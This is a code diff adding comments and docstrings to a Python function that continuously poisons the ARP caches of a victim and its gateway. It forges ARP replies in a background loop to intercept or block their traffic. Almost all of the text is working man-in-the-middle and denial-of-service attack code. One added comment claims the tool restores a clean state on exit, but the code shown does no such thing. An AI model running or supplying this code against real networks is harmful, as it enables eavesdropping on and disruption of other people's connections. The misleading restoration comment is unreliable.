@@ -11,29 +11,31 @@ def continuous_arp_dos(
     iface: str = None,
     interval: float = 2.0
 ):
-
+    """Continuously poisons ARP caches of both victim and gateway to perform MiTM/DoS."""
     gateway_ip = gateway_ip or get_default_gateway()
     attacker_mac = attacker_mac or get_my_mac()
 
+    # Craft deceptive ARP reply packets: telling victim we are the gateway, and vice versa
     pkt_to_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=attacker_mac)
     pkt_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=attacker_mac)
 
     is_running = True
 
     def loop():
+        """Background loop repeatedly broadcasting false ARP mappings."""
         while is_running:
             send(pkt_to_victim, iface=iface, verbose=False)
             send(pkt_to_gateway, iface=iface, verbose=False)
             time.sleep(interval)
 
-    # Start sending in the background
+    # Start sending poison packets in a background thread
     worker = threading.Thread(target=loop, daemon=True)
     worker.start()
 
     print(f"[RED] Poisoning: {victim_ip} <-> {gateway_ip}")
     input("Press Enter to stop...\n")
 
-    # Stop the loop
+    # Stop background loop and restore clean state
     is_running = False
     print("[+] Stopped.")
 
